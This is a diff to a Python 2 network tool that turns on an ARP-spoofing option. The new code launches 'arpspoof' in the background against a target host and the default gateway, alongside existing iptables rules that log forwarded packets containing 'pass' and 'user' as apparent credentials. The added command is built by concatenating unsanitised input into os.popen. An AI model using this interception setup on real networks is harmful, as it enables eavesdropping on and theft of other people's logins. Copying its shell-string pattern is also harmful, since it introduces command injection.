@@ -76,11 +76,10 @@ parser.add_argument('--permit', action='store', dest='permitrules', default="non
 
 
 ##Still alpha.. not implemented mitm firewall yet
-#parser.add_argument('--spoof', action='store_true', dest='arpspoof',
-   #                 help='Enable arp spoofing to apply firewall rules on eth0')
+parser.add_argument('--spoof', action='store', default="none", dest='arpspoof', help='Enable arp spoofing to apply firewall rules')
 
 
-#parser.add_argument('--dg', action='store', dest='dgIP', default="192.168.1.1", help='Specify the ip address of the default gateway to spoof ')
+parser.add_argument('--dg', action='store', dest='dgIP', default="none", help='Specify the ip address of the default gateway to spoof ')
 
 
 
@@ -178,7 +177,17 @@ if(results.log): #Full Logger.. then Grab data from syslog and save it into data
     os.popen("iptables -I FORWARD -p all -m string --string 'pass' --algo kmp -j LOG --log-prefix 'PASSWORD-SDS'")
     os.popen("iptables -I FORWARD -p all -m string --string 'user' --algo kmp  -j LOG --log-prefix 'USERNAME-SDS'")
     
-        
+
+if not(results.arpspoof=="none"):
+        print "im in"
+        target=results.mitm
+        if(results.dgIP=="none"):
+                dg=os.popen("ip route show | grep 'default' | awk '{print $3}' ").read()
+                dg=dg.split()[0] #Takes First Default Gateway IP from ip route table
+                print dg
+        else:
+                dg=results.dgIP
+        os.popen("nohup arpspoof -t "+target+" "+dg+" >/dev/null 2>&1 &")
 
 
 if(results.flush): #Restore iptables
